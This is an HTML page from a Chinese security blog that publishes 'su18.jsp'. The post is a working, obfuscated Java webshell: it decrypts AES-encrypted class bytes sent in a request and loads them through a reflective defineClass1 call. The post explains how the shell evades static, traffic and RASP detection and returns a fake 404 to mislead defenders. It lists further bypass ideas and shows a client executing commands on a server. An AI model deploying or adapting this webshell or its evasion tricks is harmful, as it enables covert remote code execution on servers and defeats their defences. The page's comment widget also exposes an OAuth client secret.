@@ -1,0 +1,316 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>su18.jsp | 素十八</title>
+<meta name="description" content="你救赎的人 终将成为你的光" />
+<link rel="shortcut icon" href="https://su18.org/favicon.ico?v=1749017091939">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://su18.org/styles/main.css">
+
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-154954923-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-154954923-1');
+</script>
+
+
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://su18.org">
+  <img class="avatar" src="https://su18.org/images/avatar.png?v=1749017091939" alt="">
+  </a>
+  <h1 class="site-title">
+    素十八
+  </h1>
+  <p class="site-description">
+    你救赎的人 终将成为你的光
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="http://javasec.org" class="menu" target="_blank">
+          Javasec
+        </a>
+      
+    
+      
+        <a href="https://www.downly.cn/" class="menu" target="_blank">
+          Downly
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/su18" target="_blank">
+          <i class="fab fa-github"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/K_MnO4_" target="_blank">
+          <i class="fab fa-twitter"></i>
+        </a>
+      
+    
+      
+        <a href="https://weibo.com/u/1945525883" target="_blank">
+          <i class="fab fa-weibo"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              su18.jsp
+            </h2>
+            <div class="post-info">
+              <span>
+                2020-09-23
+              </span>
+              <span>
+                6 min read
+              </span>
+              
+                <a href="https://su18.org/tag/f16FB3h4R/" class="post-tag">
+                  # Java
+                </a>
+              
+                <a href="https://su18.org/tag/4JBdqT7-Dd/" class="post-tag">
+                  # Webshell
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://su18.org/post-images/su18.jsp.jpg" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <p>太久没有写文章了，觉得有必要水一篇。</p>
+<p>最近一直在忙着开发公司项目，对于最新的安全漏洞以及RASP技术的研究暂时没有跟的特别紧，所以也就没什么好分享的，不过也在抽空修修改改的写点小东西，先发一个webshell。</p>
+<h1 id="一-代码">一、代码</h1>
+<p>su18.jsp</p>
+<pre><code class="language-java">&lt;%
+    final String s = request.getQueryString();
+    final String e = new String(new byte[]{115, 101, 97, 114, 99, 104, 61, 116, 101, 120, 116});
+    final String k = new String(new byte[]{65, 69, 83});
+    final String t = new String(new byte[]{106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 67, 108, 97, 115, 115, 76, 111, 97, 100, 101, 114});
+    final String p = new String(new byte[]{100, 101, 102, 105, 110, 101, 67, 108, 97, 115, 115, 49});
+    if (s != null &amp;&amp; s.contains(e)) {
+        Thread d = new Thread(new Runnable() {
+            public void run() {
+                try {
+                    javax.crypto.Cipher c = javax.crypto.Cipher.getInstance(k);
+                    c.init(2, new javax.crypto.spec.SecretKeySpec(s.replaceAll(&quot;[=|&amp;\\d]&quot;, &quot;&quot;).substring(0, 16).getBytes(), k));
+                    byte[] b = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getInputStream()));
+                    java.lang.reflect.Method m = Class.forName(t).getDeclaredMethod(p, String.class, byte[].class,
+                            int.class, int.class, java.security.ProtectionDomain.class, String.class);
+                    m.setAccessible(true);
+                    ((Class&lt;?&gt;) m.invoke(Thread.currentThread().getContextClassLoader(), null, b, 0, b.length, null, null))
+                            .newInstance().equals(pageContext);
+                } catch (Exception ignored) {
+                }
+            }
+        });
+        d.start();
+        d.join(1000 * 5);
+    }
+    response.sendError(404);
+%&gt;
+</code></pre>
+<h1 id="二-逻辑">二、逻辑</h1>
+<p>逻辑是比较好看懂的，如果你看不明白我要干嘛，那你就可以理解为是冰蝎马的魔改版，不过这里我关注的有几个点简单说一下。</p>
+<p>第一：本质上是一个 ClassLoader 的马，不过是反射调用了 <code>ClassLoader</code> 的 <code>defineClass1</code> 方法，使用了 <code>Thread.currentThread().getContextClassLoader()</code> 作为实例传入，这样不用自定义类加载器，也能绕过一些对于 <code>loadClass</code> 等常用方法的拦截。</p>
+<p>第二：可以看到全部的字符串采用了<code>new String(new byte[]{115, 101,.., 116});</code> 的写法，虽然没什么卵用，但还是能过一些静态检测的逻辑或正则。</p>
+<p>第三：这边获取参数使用了 <code>request.getQueryString()</code>，进行处理后取了前16位作为AES的密钥，因此这需要请求端做同样的事。</p>
+<p>第四：反射调用 <code>define1</code> 方法，需要 <code>setAccessible(true)</code>。</p>
+<p>第五：创建实例、写入回显的部分与冰蝎一致，因为冰蝎重写 <code>equals</code> 的方法确实写起来比较短，所以就拿过来用了。</p>
+<p>第六：在JSP中新起线程执行我们的动作，别忘了<code>join</code>一下等回显写入<code>response</code>中，我这里给了5秒的超时时间。当然了，这是基操勿六。</p>
+<p>第七：最后一行写个<code>response.sendError(404);</code> 逗一逗整天怼着安全设备看的工程师。</p>
+<h1 id="三-思路">三、思路</h1>
+<p>思路大致介绍完了，再说一下为啥要这么干。</p>
+<h2 id="1-执行方式">1. 执行方式</h2>
+<p>下面这个项目里有一些不同类型的JSP Webshells，虽然我对这个大佬的分类方式有异议，不过不重要</p>
+<p><a href="https://github.com/threedr3am/JSP-Webshells">https://github.com/threedr3am/JSP-Webshells</a></p>
+<p>我们想要一个功能全的webshell，首先需要的就是将字符串变为代码的能力，在其他语言中均有 <code>eval()</code> 或类似的函数来实现这个功能，虽然Java版本高了之后也有，但是考虑到目标服务器的JDK版本通常不会太高，所以还是不能使用。</p>
+<p>而 Java 中有此能力的机制也并不多。在进行了考虑和对比之后，我这里采用的是 ClassLoader 的方式。</p>
+<h2 id="2-绕过检测">2. 绕过检测</h2>
+<p>首先我们写了一个webshell，webshell得放在服务器上才能起作用，否则就是一串很长的字符串保存在一个文件里。因此我们的大前提就是有办法把这个文件放上去。在有这个前提的情况下，我们所需要面对的检测手段就是静态检测、流量特征检测、代码层面的动态拦截（RASP或其他手段等）。</p>
+<p>静态检测就不说了，变变形，编编码什么的，流量特征检测也不说了，流量层面的东西很好改，换个编码加密替换个字符啥的，这两点的主动权其实一直都在攻击方这里的。</p>
+<p>唯独是RASP这种的主动权在防守方，攻击方只能去找一些绕过防御的办法，我这里随便写一些思路。</p>
+<ul>
+<li>翻遍 api，找一些Java自带的或常用的一些没人用的方法，绕过几率大一点。</li>
+<li>调用就调底层方法，不调表面API。</li>
+<li>不要直接调，反射去某些类里取对象，改值，使你的调用链变幻莫测。</li>
+<li>新起线程进行操作。</li>
+<li>自己实现JNI上传执行永远是绕过防护的终极手段，参照 PHP 中的 LD_PRELOAD。</li>
+<li>等等。</li>
+</ul>
+<h2 id="3-持久化">3. 持久化</h2>
+<p>我不知道我不会我没干过我是网络工程师</p>
+<h1 id="四-客户端实现">四、客户端实现</h1>
+<p>写个这么复杂的 webshell 肯定要写个客户端去连啊，不然怎么用啊</p>
+<p>目前实现的功能并不多，样式的也没调，就以命令执行为例做个简单演示吧。</p>
+<figure data-type="image" tabindex="1"><img src="https://su18.org/post-images/1600849856620.png" alt="" loading="lazy"></figure>
+<p>执行命令成功</p>
+<figure data-type="image" tabindex="2"><img src="https://su18.org/post-images/1600850025405.png" alt="" loading="lazy"></figure>
+<p>实现了可以选择使用不同函数执行功能</p>
+<figure data-type="image" tabindex="3"><img src="https://su18.org/post-images/1600850310269.png" alt="" loading="lazy"></figure>
+<p>切换底层调用或不常用API后执行依旧正常，绕各种防御轻轻松松</p>
+<figure data-type="image" tabindex="4"><img src="https://su18.org/post-images/1600850423613.png" alt="" loading="lazy"></figure>
+<h1 id="五-后续">五、后续</h1>
+<p>注册成 Filter/Servlet 搞内存马？读取JVM中的敏感信息？功能很好写，主要看你思路。网上不少后续的骚操作，可以参考一下，不是这篇文章的重点，略。</p>
+<h1 id="六-参考链接">六、参考链接</h1>
+<p><a href="http://p2j.cn">http://p2j.cn</a></p>
+<p><a href="http://javasec.org">http://javasec.org</a></p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E4%B8%80-%E4%BB%A3%E7%A0%81">一、代码</a></li>
+<li><a href="#%E4%BA%8C-%E9%80%BB%E8%BE%91">二、逻辑</a></li>
+<li><a href="#%E4%B8%89-%E6%80%9D%E8%B7%AF">三、思路</a>
+<ul>
+<li><a href="#1-%E6%89%A7%E8%A1%8C%E6%96%B9%E5%BC%8F">1. 执行方式</a></li>
+<li><a href="#2-%E7%BB%95%E8%BF%87%E6%A3%80%E6%B5%8B">2. 绕过检测</a></li>
+<li><a href="#3-%E6%8C%81%E4%B9%85%E5%8C%96">3. 持久化</a></li>
+</ul>
+</li>
+<li><a href="#%E5%9B%9B-%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AE%9E%E7%8E%B0">四、客户端实现</a></li>
+<li><a href="#%E4%BA%94-%E5%90%8E%E7%BB%AD">五、后续</a></li>
+<li><a href="#%E5%85%AD-%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5">六、参考链接</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://su18.org/post/irP0RsYK1/">
+              <h3 class="post-title">
+                Java Instrumentation
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '21ee097e0f08e9b76b4b',
+    clientSecret: 'bda6c4a0d4dc3f275da2e82d2d59b683274ff195',
+    repo: 'blogtalk',
+    owner: 'su18',
+    admin: ['su18'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  友情链接：<a href="https://www.yzmm.net/" target="_blank">园长</a> <a href="https://www.cnblogs.com/H4ck3R-XiX/" target="_blank">赵公子</a> <a href="https://fynch3r.github.io" target="_blank">fynch3r</a> <a href="https://g1asssy.com/" target="_blank">Glassy@Amadeus</a> <a href="https://iswin.org/" target="_blank">随风</a>  <a href="https://www.9170.org/" target="_blank">健宇</a>  <a href="https://fuzz7j.github.io/" target="_blank">fuzz7j</a>  <a href="https://blog.zgsec.cn/" target="_blank">曾哥</a> | 
+  <a class="rss" href="https://su18.org/atom.xml" target="_blank">RSS</a>
+</div>
+
+<script>
+  hljs.initHighlightingOnLoad()
+
+  let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+  // This should probably be throttled.
+  // Especially because it triggers during smooth scrolling.
+  // https://lodash.com/docs/4.17.10#throttle
+  // You could do like...
+  // window.addEventListener("scroll", () => {
+  //    _.throttle(doThatStuff, 100);
+  // });
+  // Only not doing it here to keep this Pen dependency-free.
+
+  window.addEventListener("scroll", event => {
+    let fromTop = window.scrollY;
+
+    mainNavLinks.forEach((link, index) => {
+      let section = document.getElementById(decodeURI(link.hash).substring(1));
+      let nextSection = null
+      if (mainNavLinks[index + 1]) {
+        nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+      }
+      console.log('section.offsetHeight', section.offsetHeight);
+      if (section.offsetTop <= fromTop) {
+        if (nextSection) {
+          if (nextSection.offsetTop > fromTop) {
+            link.classList.add("current");
+          } else {
+            link.classList.remove("current");    
+          }
+        } else {
+          link.classList.add("current");
+        }
+      } else {
+        link.classList.remove("current");
+      }
+    });
+  });
+
+</script>
+
+      </div>
+    </div>
+  </body>
+</html>
